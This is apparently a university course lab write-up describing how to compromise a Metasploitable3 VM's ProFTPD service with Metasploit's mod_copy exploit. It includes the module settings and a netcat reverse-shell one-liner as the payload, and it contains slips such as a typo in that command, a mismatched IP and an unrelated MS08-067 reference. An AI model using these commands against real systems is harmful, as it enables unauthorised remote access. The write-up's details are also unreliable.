# Phase 1 – Setup and Compromise of a Vulnerable Service

This phase focused on preparing the environment and compromising a vulnerable service using both **Metasploit** and a **custom script**. It reflects hands-on penetration testing and offensive security skills, performed in a safe and isolated environment.

---

## Disclaimer
This guide is created **strictly for educational purposes** within the scope of the KFUPM ICS344 course. Attempting to compromise systems without proper authorization is illegal and unethical.

---

## Objectives

- Set up Metasploitable3 (Victim) and Kali Linux (Attacker)
- Verify connectivity and identify open ports/services
- Exploit a vulnerable service using Metasploit
- Build and execute a **custom exploit script**
- Document all steps and commands used

---

## Victim Environment: Metasploitable3

### Setup Steps

1. **Download and then launch the imported Metasploitable 3 VM**  
   `https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/`  

2. **Login:**  
   Username: `vagrant`  
   Password: `vagrant`
   

---

## Attacker Environment: Kali Linux

### Initial Setup & Updates  
`sudo apt update && sudo apt upgrade -y`

---

## Ensuring Connectivity Between VMs

### Get victim machine IP:  
Run inside Metasploitable3: `ipconfig`

### Get attacker machine IP:  
Run inside Kali: `ip a`

### Test connectivity:  
`ping 192.168.56.101`   

![image](https://github.com/user-attachments/assets/2277bcbe-8b33-4d3e-b34e-4a36e0c0e326)

---

## Port Scanning with Nmap  
`nmap -sV 192.168.56.101`

Sample Output Snippet:

![image](https://github.com/user-attachments/assets/3e1945ac-9c08-4186-b615-5cbc3e4157b1)


---

## Selected Service: ftp (port 21)

Due to its history of vulnerabilities and real-world relevance , we selected **ftp** for this attack phase.

---

## Exploitation using Metasploit

### Launch Metasploit Console:  
`sudo msfconsole`

### Search services available for exploitation:
`search proftpd`

![image](https://github.com/user-attachments/assets/ec755932-aafb-48a2-b310-7f6655256c60)


### Load ftp Exploit Module:  
`use exploit/unix/ftp/proftpd_modcopy_exec`

### Check required options for exploitation:  
`show options`

![image](https://github.com/user-attachments/assets/081249f6-fa57-4fc0-9be2-f3dab5b0690e)


### Set required options:  
`set RHOSTS 192.168.56.101`  
`set SITEPATH /var/www/html`   
`set AllowNoCleanup true`

### Check and select an available payload:  
`show payloads`
`set payload cmd/unix/generic`

### Check required options for payload:  
`show payload options`

![image](https://github.com/user-attachments/assets/45ea9953-3f70-4c0b-b52e-459e4520024a)


### Set required payload options:    
`set cmd rm /tmp/f;mkfifo /tmp/f; ca /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f`

### Start listening from the victim machine:

![image](https://github.com/user-attachments/assets/e3dd1956-ee44-456b-82a1-06a62149ef8c)


### Exploit!  
`run`

### Verify access:

![image](https://github.com/user-attachments/assets/2a63233c-c97f-4522-9169-aec7a06f986b)


 If successful, a Meterpreter session is opened, providing full access.

---

## Custom Exploitation Script

We wrote a **Python script** to automate the attack for demonstration.

### Connect to the victim's ftp:

![image](https://github.com/user-attachments/assets/57344a02-0df7-470e-85c9-dcaae6ead95c)

### Run the script: 

![image](https://github.com/user-attachments/assets/04aef6fc-55a9-4443-8470-f39915c966a6)


---



## Challenges Faced

- Issues with Metasploitable3 provisioning on some hardware
- Initial network misconfiguration between VMs
- Failing to open sessions after using the `run` command
---

## Summary

| Task                        | Status       |
|-----------------------------|--------------|
| Metasploitable3 setup       |  Done      |
| Kali Linux setup            |  Done      |
| Service enumeration (Nmap)  |  Done      |
| Metasploit attack           |  Success   |
| Custom script creation      |  Tested    |
| Screenshots and documentation | Attached |

---

## References

- [Metasploit Framework](https://www.metasploit.com/)
- [Rapid7 Guide on Metasploitable3](https://github.com/rapid7/metasploitable3)
- [MS08-067 Vulnerability](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
